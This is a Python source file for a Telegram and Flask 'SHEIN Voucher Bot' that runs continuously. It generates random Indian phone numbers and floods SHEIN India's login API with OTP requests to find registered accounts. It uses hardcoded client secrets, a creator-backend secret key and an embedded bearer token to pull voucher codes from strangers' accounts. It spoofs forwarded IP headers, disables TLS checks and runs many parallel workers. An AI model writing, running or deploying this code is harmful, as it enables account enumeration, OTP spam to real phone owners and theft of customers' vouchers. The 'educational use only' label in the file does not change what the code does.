#!/usr/bin/env python3
"""
SHEIN Voucher Bot - Ultra Fast Auto-Collector
Version: 8.0 - Clean and working
Deployment: Render.com Flask compatible
"""

import os
import json
import random
import time
import threading
import logging
import uuid
import hashlib
import requests
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from flask import Flask, jsonify
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=os.getenv('LOG_LEVEL', 'INFO')
)
logger = logging.getLogger(__name__)

# Flask app for Render
app = Flask(__name__)

# Try to import Telegram modules
TELEGRAM_AVAILABLE = False
try:
    from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
    from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
    TELEGRAM_AVAILABLE = True
    logger.info("✅ Telegram module loaded successfully")
except ImportError as e:
    logger.warning(f"⚠️ Telegram module not installed: {e}")

class SheinVoucherBot:
    def __init__(self):
        # Bot configuration
        self.bot_token = os.getenv('TELEGRAM_BOT_TOKEN')
        
        # Files configuration
        self.data_dir = "data"
        os.makedirs(self.data_dir, exist_ok=True)
        
        # File paths
        self.nm_file = os.path.join(self.data_dir, "nm.json")
        self.vouchers_file = os.path.join(self.data_dir, "vouchers.json")
        self.users_file = os.path.join(self.data_dir, "users.json")
        
        # Performance settings
        self.max_workers = int(os.getenv('MAX_WORKERS', '50'))
        self.request_timeout = int(os.getenv('REQUEST_TIMEOUT', '10'))
        self.batch_size = int(os.getenv('BATCH_SIZE', '20'))
        
        # Mode settings
        self.collector_running = False
        self.telegram_bot_running = False
        
        # Load data
        self.load_all_data()
        
        # Thread pool
        self.executor = ThreadPoolExecutor(max_workers=self.max_workers)
        
        # Thread safety
        self.lock = threading.Lock()
        
        # Performance tracking
        self.requests_per_second = 0
        self.last_request_count = 0
        self.last_request_time = time.time()
        
        # Telegram bot
        self.application = None
        
        logger.info(f"🚀 Bot initialized with {self.max_workers} workers!")
    
    def load_all_data(self):
        """Load all data files"""
        self.numbers = self.load_json(self.nm_file, [])
        self.vouchers = self.load_json(self.vouchers_file, [])
        self.users = self.load_json(self.users_file, {})
        logger.info(f"📊 Data loaded: {len(self.numbers)} numbers, {len(self.vouchers)} vouchers")
    
    def load_json(self, filename, default):
        """Load JSON file"""
        try:
            if os.path.exists(filename):
                with open(filename, 'r', encoding='utf-8') as f:
                    return json.load(f)
        except:
            pass
        return default
    
    def save_json(self, filename, data):
        """Save data to JSON file"""
        try:
            with self.lock:
                with open(filename, 'w', encoding='utf-8') as f:
                    json.dump(data, f, indent=2, ensure_ascii=False)
        except:
            pass
    
    def generate_valid_indian_number(self):
        """Generate valid Indian mobile numbers"""
        prefixes = ['70', '71', '72', '73', '74', '75', '76', '77', '78', '79',
                   '80', '81', '82', '83', '84', '85', '86', '87', '88', '89',
                   '90', '91', '92', '93', '94', '95', '96', '97', '98', '99']
        
        prefix = random.choice(prefixes)
        number = prefix + ''.join([str(random.randint(0, 9)) for _ in range(8)])
        return number
    
    def random_ip(self):
        """Generate random IP address"""
        return f"{random.randint(100, 200)}.{random.randint(10, 200)}.{random.randint(10, 200)}.{random.randint(10, 250)}"
    
    def gen_device_id(self):
        """Generate random device ID"""
        device_str = f"android-{int(time.time())}-{random.randint(10000, 99999)}"
        return hashlib.md5(device_str.encode()).hexdigest().upper()
    
    def random_name(self):
        """Generate random Indian name"""
        names = ["Aarav", "Ankit", "Rahul", "Rohit", "Aman", "Vikas", "Kunal", "Sahil", "Mohit",
                "Priya", "Neha", "Anjali", "Pooja", "Sneha", "Riya", "Kriti", "Divya", "Shreya"]
        return random.choice(names)
    
    def random_gender(self):
        """Generate random gender"""
        return random.choice(["MALE", "FEMALE"])
    
    def make_request(self, url, method="POST", data=None, headers=None, timeout=None, retry=1):
        """Make HTTP request"""
        if timeout is None:
            timeout = self.request_timeout
        
        try:
            if method.upper() == "POST":
                response = requests.post(url, data=data, headers=headers, timeout=timeout, verify=False)
            else:
                response = requests.get(url, headers=headers, timeout=timeout, verify=False)
            
            # Update performance counter
            current_time = time.time()
            self.last_request_count += 1
            if current_time - self.last_request_time >= 1:
                self.requests_per_second = self.last_request_count
                self.last_request_count = 0
                self.last_request_time = current_time
            
            return response if response and response.status_code == 200 else None
                
        except:
            return None
    
    def send_otp(self, number):
        """Send OTP to number"""
        try:
            headers = {
                "X-Tenant": "B2C",
                "Accept": "application/json",
                "User-Agent": "Android",
                "client_type": "Android/35",
                "client_version": "1.0.12",
                "Authorization": "Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJjbGllbnQiLCJjbGllbnROYW1lIjoidHJ1c3RlZF9jbGllbnQiLCJyb2xlcyI6W3sibmFtZSI6IlJPTEVfVFJVU1RFRF9DTElFTlQifV0sInRlbmFudElkIjoiU0hFSU4iLCJleHAiOjE3NzE3ODE4MDQsImlhdCI6MTc2OTE4OTgwNH0.HsDutIjo9XEnC6Ju1_MZsjj3v-T52_2K4L0RKdnsNncEAjlNEA4MDEA39yLiGdaDzvNSmAy3fKgQcWE_WTC0RvPhL4_F9bzAFoK6LASjb1LzOKilHAdlFQtUDfZPgCdq9iXg95-v2-qv3vjoF2K47I7i9v_v8EKXO_OfqQILDyBzIqumYE3VRpDG1zJhIUijuDkmIrfsz8w-0m40gccXfsnN5IeRwp_l98l-amUfDs1bI167oWEBi-gGby7Fqzku8FxCicZ17cwhiWTs8kzopkKP1H50cFMBmH7cZR-WNbM_0OBdj4IcxT-2jHm-qoqMCGykud33KFLU2PfS8VU45g",
                "X-TENANT-ID": "SHEIN",
                "ad_id": str(uuid.uuid4()),
                "Content-Type": "application/x-www-form-urlencoded",
                "Accept-Encoding": "gzip",
                "Connection": "keep-alive",
                "X-Forwarded-For": self.random_ip()
            }
            
            data = f"mobileNumber={number}"
            response = self.make_request(
                "https://api.sheinindia.in/uaas/login/sendOTP?client_type=Android%2F35&client_version=1.0.12",
                data=data,
                headers=headers,
                timeout=5
            )
            
            if response:
                result = response.json()
                return result.get("success") is True
            
            return False
            
        except:
            return False
    
    def get_client_token(self):
        """Get client token"""
        device_id = self.gen_device_id()
        ip = self.random_ip()
        
        headers = {
            "Client_type": "Android/29",
            "Client_version": "1.0.8",
            "User-Agent": "Android",
            "X-Tenant-Id": "shein",
            "Ad_id": device_id,
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Forwarded-For": ip,
            "Accept": "application/json"
        }
        
        data = "grantType=client_credentials&clientName=trusted_client&clientSecret=secret"
        response = self.make_request(
            "https://api.sheinindia.in/uaas/jwt/token/client",
            data=data,
            headers=headers,
            timeout=5
        )
        
        if response:
            try:
                return response.json()['access_token']
            except:
                pass
        return None
    
    def check_account(self, mobile, client_token):
        """Check account"""
        ip = self.random_ip()
        
        headers = {
            "Authorization": f"Bearer {client_token}",
            "Client_type": "Android/29",
            "Client_version": "1.0.8",
            "User-Agent": "Android",
            "X-Tenant-Id": "shein",
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Forwarded-For": ip,
            "Accept": "application/json"
        }
        
        data = f"mobileNumber={mobile}"
        response = self.make_request(
            "https://api.sheinindia.in/uaas/accountCheck",
            data=data,
            headers=headers,
            timeout=5
        )
        
        if response:
            try:
                return response.json()['encryptedId']
            except:
                pass
        return None
    
    def get_creator_token(self, mobile, encrypted_id):
        """Get creator token"""
        ip = self.random_ip()
        
        headers = {
            "Content-Type": "application/json",
            "X-Tenant-Id": "shein",
            "User-Agent": "Android",
            "X-Forwarded-For": ip,
            "Accept": "application/json"
        }
        
        data = {
            "client_type": "Android/29",
            "client_version": "1.0.8",
            "gender": self.random_gender(),
            "phone_number": mobile,
            "secret_key": "3LFcKwBTXcsMzO5LaUbNYoyMSpt7M3RP5dW9ifWffzg",
            "user_id": encrypted_id,
            "user_name": self.random_name()
        }
        
        response = self.make_request(
            "https://shein-creator-backend-151437891745.asia-south1.run.app/api/v1/auth/generate-token",
            data=json.dumps(data),
            headers=headers,
            timeout=5
        )
        
        if response:
            try:
                return response.json()['access_token']
            except:
                pass
        return None
    
    def get_voucher(self, mobile, encrypted_id, creator_token):
        """Get voucher data"""
        ip = self.random_ip()
        
        headers = {
            "Authorization": f"Bearer {creator_token}",
            "X-Encrypted-Id": encrypted_id,
            "Origin": "https://sheinverse.galleri5.com",
            "Referer": "https://sheinverse.galleri5.com/",
            "User-Agent": "Android",
            "X-Forwarded-For": ip,
            "Accept": "application/json"
        }
        
        response = self.make_request(
            "https://shein-creator-backend-151437891745.asia-south1.run.app/api/v1/user",
            method="GET",
            headers=headers,
            timeout=5
        )
        
        if response:
            try:
                data = response.json()
                if 'user_data' in data and 'voucher_data' in data['user_data']:
                    voucher_data = data['user_data']['voucher_data']
                    return {
                        "mobile": mobile,
                        "voucher_code": voucher_data.get('voucher_code', 'N/A'),
                        "amount": voucher_data.get('voucher_amount', 'N/A'),
                        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    }
            except:
                pass
        return None
    
    def find_valid_numbers_batch(self, batch_size=10):
        """Find multiple valid numbers in parallel"""
        numbers_to_check = [self.generate_valid_indian_number() for _ in range(batch_size)]
        valid_numbers = []
        
        # Send OTPs in parallel
        with ThreadPoolExecutor(max_workers=batch_size) as executor:
            futures = {executor.submit(self.send_otp, num): num for num in numbers_to_check}
            
            for future in as_completed(futures):
                number = futures[future]
                try:
                    if future.result():
                        valid_numbers.append(number)
                except:
                    pass
        
        # Save new numbers
        if valid_numbers:
            with self.lock:
                new_numbers = [num for num in valid_numbers if num not in self.numbers]
                self.numbers.extend(new_numbers)
                if new_numbers:
                    self.save_json(self.nm_file, self.numbers)
        
        return valid_numbers
    
    def process_numbers_for_vouchers(self, numbers):
        """Process multiple numbers for vouchers in parallel"""
        vouchers = []
        
        def process_single(number):
            try:
                client_token = self.get_client_token()
                if not client_token:
                    return None
                
                encrypted_id = self.check_account(number, client_token)
                if not encrypted_id:
                    return None
                
                creator_token = self.get_creator_token(number, encrypted_id)
                if not creator_token:
                    return None
                
                voucher = self.get_voucher(number, encrypted_id, creator_token)
                return voucher
            except:
                return None
        
        # Process in parallel
        with ThreadPoolExecutor(max_workers=len(numbers)) as executor:
            futures = {executor.submit(process_single, num): num for num in numbers}
            
            for future in as_completed(futures):
                try:
                    voucher = future.result()
                    if voucher:
                        vouchers.append(voucher)
                except:
                    pass
        
        return vouchers
    
    def run_collector(self):
        """Run collector in background"""
        if self.collector_running:
            return
        
        self.collector_running = True
        logger.info("🚀 Starting background collector...")
        
        batch_count = 0
        total_vouchers = 0
        
        while self.collector_running:
            try:
                batch_count += 1
                
                # Find valid numbers
                valid_numbers = self.find_valid_numbers_batch(self.batch_size)
                
                if not valid_numbers:
                    time.sleep(0.5)
                    continue
                
                # Process for vouchers
                batch_vouchers = self.process_numbers_for_vouchers(valid_numbers)
                
                if batch_vouchers:
                    # Save vouchers
                    with self.lock:
                        self.vouchers.extend(batch_vouchers)
                        self.save_json(self.vouchers_file, self.vouchers)
                    
                    total_vouchers += len(batch_vouchers)
                    total_value = 0
                    for voucher in batch_vouchers:
                        try:
                            amount = float(str(voucher["amount"]).replace("₹", "").replace(",", "").strip())
                            total_value += amount
                        except:
                            pass
                    
                    if batch_count % 5 == 0:
                        logger.info(f"✅ Batch {batch_count}: Found {len(batch_vouchers)} vouchers (₹{total_value:.2f}) | Total: {total_vouchers}")
                
                time.sleep(0.1)
                
            except Exception as e:
                logger.error(f"Batch error: {e}")
                time.sleep(1)
        
        logger.info("🛑 Collector stopped")

# ==============================================
# TELEGRAM BOT HANDLERS (Separate class)
# ==============================================

class TelegramBot:
    def __init__(self, voucher_bot):
        self.voucher_bot = voucher_bot
        self.application = None
        self.running = False
    
    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /start command"""
        user_id = str(update.effective_user.id)
        
        # Save user
        if user_id not in self.voucher_bot.users:
            self.voucher_bot.users[user_id] = {
                "username": update.effective_user.username,
                "first_name": update.effective_user.first_name,
                "join_date": datetime.now().isoformat(),
                "last_active": datetime.now().isoformat()
            }
            self.voucher_bot.save_json(self.voucher_bot.users_file, self.voucher_bot.users)
        
        keyboard = [
            [InlineKeyboardButton("🚀 Start Auto-Collector", callback_data="start")],
            [InlineKeyboardButton("📊 Statistics", callback_data="stats")],
            [InlineKeyboardButton("🎫 View Vouchers", callback_data="vouchers")],
            [InlineKeyboardButton("❓ Help", callback_data="help")]
        ]
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            "🎫 *SHEIN Voucher Bot*\n\n"
            "⚡ Ultra Fast Auto-Collector\n"
            "🔥 Continuous background collection\n"
            "💨 Maximum speed processing\n\n"
            "Select an option:",
            reply_markup=reply_markup,
            parse_mode="Markdown"
        )
    
    async def stats_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /stats command"""
        total_vouchers = len(self.voucher_bot.vouchers)
        total_users = len(self.voucher_bot.users)
        
        total_value = 0
        for voucher in self.voucher_bot.vouchers:
            try:
                amount = str(voucher.get('amount', '0')).replace('₹', '').replace(',', '').strip()
                total_value += float(amount)
            except:
                pass
        
        message = (
            f"📊 *Bot Statistics*\n\n"
            f"• Total vouchers: {total_vouchers}\n"
            f"• Total value: ₹{total_value:.2f}\n"
            f"• Total users: {total_users}\n"
            f"• Valid numbers: {len(self.voucher_bot.numbers)}\n"
            f"• Requests/sec: {self.voucher_bot.requests_per_second}\n"
            f"• Collector: {'✅ Running' if self.voucher_bot.collector_running else '❌ Stopped'}"
        )
        
        await update.message.reply_text(message, parse_mode="Markdown")
    
    async def vouchers_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /vouchers command"""
        if not self.voucher_bot.vouchers:
            await update.message.reply_text(
                "📭 *No Vouchers Yet*\n\n"
                "No vouchers have been collected yet.\n"
                "Start the collector with /start",
                parse_mode="Markdown"
            )
            return
        
        # Show recent 10 vouchers
        recent = self.voucher_bot.vouchers[-10:] if len(self.voucher_bot.vouchers) > 10 else self.voucher_bot.vouchers
        vouchers_text = "\n".join([f"• `{v['voucher_code']}` - ₹{v['amount']}" for v in recent])
        
        total_value = 0
        for voucher in self.voucher_bot.vouchers:
            try:
                amount = float(str(voucher.get('amount', '0')).replace('₹', '').replace(',', '').strip())
                total_value += float(amount)
            except:
                pass
        
        message = (
            f"🎫 *Collected Vouchers*\n\n"
            f"• Total: {len(self.voucher_bot.vouchers)}\n"
            f"• Value: ₹{total_value:.2f}\n\n"
            f"*Recent vouchers:*\n{vouchers_text}"
        )
        
        if len(self.voucher_bot.vouchers) > 10:
            message += f"\n\n... and {len(self.voucher_bot.vouchers) - 10} more vouchers"
        
        await update.message.reply_text(message, parse_mode="Markdown")
    
    async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /help command"""
        help_text = (
            "🎫 *SHEIN Voucher Bot Help*\n\n"
            "*Commands:*\n"
            "• /start - Show main menu\n"
            "• /stats - Show statistics\n"
            "• /vouchers - View collected vouchers\n"
            "• /help - This help message\n\n"
            "*How it works:*\n"
            "1. Bot runs continuously in background\n"
            "2. Automatically finds valid numbers\n"
            "3. Fetches vouchers from valid accounts\n"
            "4. Saves all vouchers for viewing\n\n"
            "*Features:*\n"
            "• 24/7 automatic collection\n"
            "• Parallel processing\n"
            "• Real-time statistics\n"
            "• Web dashboard\n\n"
            "⚠️ Educational use only"
        )
        
        await update.message.reply_text(help_text, parse_mode="Markdown")
    
    async def callback_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle callback queries"""
        query = update.callback_query
        await query.answer()
        
        if query.data == "start":
            if not self.voucher_bot.collector_running:
                # Start collector in background thread
                collector_thread = threading.Thread(target=self.voucher_bot.run_collector, daemon=True)
                collector_thread.start()
                
                await query.edit_message_text(
                    "🚀 *Collector Started!*\n\n"
                    "Background collector is now running.\n"
                    "It will automatically:\n"
                    "• Find valid numbers\n"
                    "• Fetch vouchers\n"
                    "• Save results\n\n"
                    "Check /stats for progress.",
                    parse_mode="Markdown"
                )
            else:
                await query.edit_message_text(
                    "🟢 *Collector Already Running*\n\n"
                    "Background collector is already active.\n"
                    "Vouchers are being collected automatically.",
                    parse_mode="Markdown"
                )
        
        elif query.data == "stats":
            total_vouchers = len(self.voucher_bot.vouchers)
            total_users = len(self.voucher_bot.users)
            
            total_value = 0
            for voucher in self.voucher_bot.vouchers:
                try:
                    amount = str(voucher.get('amount', '0')).replace('₹', '').replace(',', '').strip()
                    total_value += float(amount)
                except:
                    pass
            
            message = (
                f"📊 *Live Statistics*\n\n"
                f"• Total vouchers: {total_vouchers}\n"
                f"• Total value: ₹{total_value:.2f}\n"
                f"• Total users: {total_users}\n"
                f"• Valid numbers: {len(self.voucher_bot.numbers)}\n"
                f"• Requests/sec: {self.voucher_bot.requests_per_second}\n"
                f"• Collector: {'✅ Running' if self.voucher_bot.collector_running else '❌ Stopped'}\n\n"
                f"Last updated: {datetime.now().strftime('%H:%M:%S')}"
            )
            
            await query.edit_message_text(message, parse_mode="Markdown")
        
        elif query.data == "vouchers":
            if not self.voucher_bot.vouchers:
                await query.edit_message_text(
                    "📭 *No Vouchers Yet*\n\n"
                    "No vouchers have been collected yet.\n"
                    "Start the collector to begin!",
                    parse_mode="Markdown"
                )
                return
            
            # Show recent 10 vouchers
            recent = self.voucher_bot.vouchers[-10:] if len(self.voucher_bot.vouchers) > 10 else self.voucher_bot.vouchers
            vouchers_text = "\n".join([f"• `{v['voucher_code']}` - ₹{v['amount']}" for v in recent])
            
            total_value = 0
            for voucher in self.voucher_bot.vouchers:
                try:
                    amount = float(str(voucher.get('amount', '0')).replace('₹', '').replace(',', '').strip())
                    total_value += float(amount)
                except:
                    pass
            
            message = (
                f"🎫 *Collected Vouchers*\n\n"
                f"• Total: {len(self.voucher_bot.vouchers)}\n"
                f"• Value: ₹{total_value:.2f}\n\n"
                f"*Recent vouchers:*\n{vouchers_text}"
            )
            
            if len(self.voucher_bot.vouchers) > 10:
                message += f"\n\n... and {len(self.voucher_bot.vouchers) - 10} more vouchers"
            
            await query.edit_message_text(message, parse_mode="Markdown")
        
        elif query.data == "help":
            help_text = (
                "🎫 *SHEIN Voucher Bot Help*\n\n"
                "*How to use:*\n"
                "1. Click 'Start Auto-Collector'\n"
                "2. Bot runs in background 24/7\n"
                "3. View collected vouchers anytime\n"
                "4. Check statistics for progress\n\n"
                "*Commands in chat:*\n"
                "• /start - Show menu\n"
                "• /stats - Statistics\n"
                "• /vouchers - View vouchers\n"
                "• /help - Help message\n\n"
                "*Note:*\n"
                "• Collector runs continuously\n"
                "• All vouchers are saved\n"
                "• Access via web dashboard too"
            )
            
            await query.edit_message_text(help_text, parse_mode="Markdown")
    
    def run(self):
        """Run Telegram bot with proper polling"""
        if not TELEGRAM_AVAILABLE:
            logger.error("Telegram module not available")
            return
        
        if not self.voucher_bot.bot_token:
            logger.error("No Telegram bot token provided")
            return
        
        try:
            logger.info("🤖 Starting Telegram bot...")
            
            # Create application
            self.application = Application.builder().token(self.voucher_bot.bot_token).build()
            
            # Add handlers
            self.application.add_handler(CommandHandler("start", self.start_command))
            self.application.add_handler(CommandHandler("stats", self.stats_command))
            self.application.add_handler(CommandHandler("vouchers", self.vouchers_command))
            self.application.add_handler(CommandHandler("help", self.help_command))
            
            # Add callback query handler
            self.application.add_handler(CallbackQueryHandler(self.callback_handler))
            
            # Start bot with polling
            logger.info("✅ Telegram bot starting polling...")
            self.running = True
            
            # Run the application
            self.application.run_polling(
                drop_pending_updates=True,
                allowed_updates=Update.ALL_TYPES
            )
            
        except Exception as e:
            logger.error(f"❌ Telegram bot error: {e}")
            self.running = False

# ==============================================
# FLASK ROUTES FOR RENDER
# ==============================================

voucher_bot = SheinVoucherBot()
telegram_bot = TelegramBot(voucher_bot) if TELEGRAM_AVAILABLE else None

@app.route('/')
def home():
    """Home route for Render"""
    total_vouchers = len(voucher_bot.vouchers)
    total_value = 0
    for voucher in voucher_bot.vouchers:
        try:
            amount = str(voucher.get('amount', '0')).replace('₹', '').replace(',', '').strip()
            total_value += float(amount)
        except:
            pass
    
    return jsonify({
        "status": "running",
        "vouchers_collected": total_vouchers,
        "total_value": f"₹{total_value:.2f}",
        "requests_per_second": voucher_bot.requests_per_second,
        "collector_running": voucher_bot.collector_running,
        "telegram_bot": telegram_bot.running if telegram_bot else False,
        "uptime": "24/7"
    })

@app.route('/health')
def health():
    """Health check for Render"""
    return jsonify({"status": "healthy", "timestamp": datetime.now().isoformat()})

@app.route('/stats')
def stats():
    """Statistics endpoint"""
    total_vouchers = len(voucher_bot.vouchers)
    total_users = len(voucher_bot.users)
    total_numbers = len(voucher_bot.numbers)
    
    total_value = 0
    for voucher in voucher_bot.vouchers:
        try:
            amount = str(voucher.get('amount', '0')).replace('₹', '').replace(',', '').strip()
            total_value += float(amount)
        except:
            pass
    
    return jsonify({
        "total_vouchers": total_vouchers,
        "total_value": total_value,
        "total_users": total_users,
        "valid_numbers": total_numbers,
        "requests_per_second": voucher_bot.requests_per_second,
        "collector_running": voucher_bot.collector_running,
        "performance": {
            "max_workers": voucher_bot.max_workers,
            "batch_size": voucher_bot.batch_size,
            "timeout": voucher_bot.request_timeout
        }
    })

@app.route('/vouchers')
def vouchers():
    """Vouchers endpoint"""
    return jsonify({
        "count": len(voucher_bot.vouchers),
        "vouchers": voucher_bot.vouchers[-50:] if len(voucher_bot.vouchers) > 50 else voucher_bot.vouchers
    })

@app.route('/start')
def start_collector():
    """Start auto-collector"""
    if not voucher_bot.collector_running:
        collector_thread = threading.Thread(target=voucher_bot.run_collector, daemon=True)
        collector_thread.start()
        return jsonify({"status": "started", "message": "Collector started successfully"})
    else:
        return jsonify({"status": "already_running", "message": "Collector is already running"})

# ==============================================
# MAIN ENTRY POINT
# ==============================================

def main():
    """Main function"""
    logger.info("🚀 Starting SHEIN Voucher Bot...")
    
    # Start Telegram bot in separate thread
    if voucher_bot.bot_token and TELEGRAM_AVAILABLE and telegram_bot:
        telegram_thread = threading.Thread(target=telegram_bot.run, daemon=True)
        telegram_thread.start()
        logger.info("✅ Telegram bot thread started")
    else:
        logger.info("ℹ️ Telegram bot not started (no token or module missing)")
    
    # Start collector automatically
    if os.getenv('AUTO_START', 'true').lower() == 'true':
        logger.info("🚀 Auto-starting collector...")
        collector_thread = threading.Thread(target=voucher_bot.run_collector, daemon=True)
        collector_thread.start()
        logger.info("✅ Collector thread started")
    
    # Start Flask app
    port = int(os.environ.get('PORT', 8080))
    logger.info(f"🌐 Starting Flask app on port {port}")
    
    # Simple print for debugging
    print(f"\n" + "="*50)
    print(f"🚀 SHEIN Voucher Bot is LIVE!")
    print(f"📊 Web Dashboard: http://0.0.0.0:{port}")
    print(f"🤖 Telegram Bot: {'✅ ACTIVE' if voucher_bot.bot_token else '❌ INACTIVE'}")
    print(f"⚡ Collector: {'✅ RUNNING' if voucher_bot.collector_running else '❌ STOPPED'}")
    print(f"="*50 + "\n")
    
    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)

if __name__ == "__main__":
    main()